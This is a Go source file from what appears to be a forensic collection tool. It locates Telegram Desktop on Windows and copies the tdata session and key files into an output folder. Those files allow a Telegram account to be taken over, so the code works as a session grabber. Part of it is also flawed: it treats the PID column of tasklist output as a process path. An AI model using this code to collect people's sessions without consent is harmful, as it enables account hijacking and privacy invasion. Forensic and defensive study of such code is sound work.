package Messengers

import (
	"ForensicPro/utils"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

var messengerTelegram = "Telegram"
var sessionPaths = [16]string{
	"tdata\\key_datas", "tdata\\D877F783D5D3EF8Cs", "tdata\\D877F783D5D3EF8C\\configs", "tdata\\D877F783D5D3EF8C\\maps",
	"tdata\\A7FDF864FBC10B77s", "tdata\\A7FDF864FBC10B77\\configs", "tdata\\A7FDF864FBC10B77\\maps", "tdata\\F8806DD0C461824Fs",
	"tdata\\F8806DD0C461824F\\configs", "tdata\\F8806DD0C461824F\\maps", "tdata\\C2B05980D9127787s", "tdata\\C2B05980D9127787\\configs",
	"tdata\\C2B05980D9127787\\maps", "tdata\\0CA814316818D8F6s", "tdata\\0CA814316818D8F6\\configs", "tdata\\0CA814316818D8F6\\maps",
}

func createDir(path string) {
	err := os.MkdirAll(path, 0755)
	if err != nil {
		fmt.Println("Error creating directory:", err)
	}
}

func exists(path string) bool {
	_, err := os.Stat(path)
	return !os.IsNotExist(err)
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
func TelegramSave(path string) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("An error occurred:", r)
		}
	}()
	// 获取 Telegram 进程
	cmd := exec.Command("tasklist", "/FI", "IMAGENAME eq Telegram.exe")
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error running tasklist:", err)
		return
	}
	// 检查 Telegram 路径是否存在
	appData := os.Getenv("APPDATA")
	messengerPath := filepath.Join(appData, "Telegram Desktop")
	if !exists(messengerPath) && !strings.Contains(string(output), "Telegram.exe") {
		return
	}

	var paths []string
	if strings.Contains(string(output), "Telegram.exe") {
		lines := strings.Split(string(output), "\n")
		for _, line := range lines {
			if strings.Contains(line, "Telegram.exe") {
				parts := strings.Fields(line)
				if len(parts) > 1 {
					processPath := parts[1]
					dir := filepath.Dir(processPath)
					if !contains(paths, dir) {
						paths = append(paths, dir)
					}
				}
			}
		}
	}
	if !contains(paths, messengerPath) {
		paths = append(paths, messengerPath)
	}

	for j, p := range paths {
		text := filepath.Join(path, messengerTelegram)
		createDir(text)
		createDir(filepath.Join(text, fmt.Sprintf("tdata_%d", j)))
		createDir(filepath.Join(text, fmt.Sprintf("tdata_%d\\D877F783D5D3EF8C", j)))
		createDir(filepath.Join(text, fmt.Sprintf("tdata_%d\\A7FDF864FBC10B77", j)))
		createDir(filepath.Join(text, fmt.Sprintf("tdata_%d\\F8806DD0C461824F", j)))
		createDir(filepath.Join(text, fmt.Sprintf("tdata_%d\\C2B05980D9127787", j)))
		createDir(filepath.Join(text, fmt.Sprintf("tdata_%d\\0CA814316818D8F6", j)))

		for _, sp := range sessionPaths {
			src := filepath.Join(p, sp)
			dst := filepath.Join(text, strings.Replace(sp, "tdata", fmt.Sprintf("tdata_%d", j), 1))
			if exists(src) {
				utils.CopyFile(src, dst)
			}
		}
	}
	fmt.Println("Telegram 信息取证结束")
}
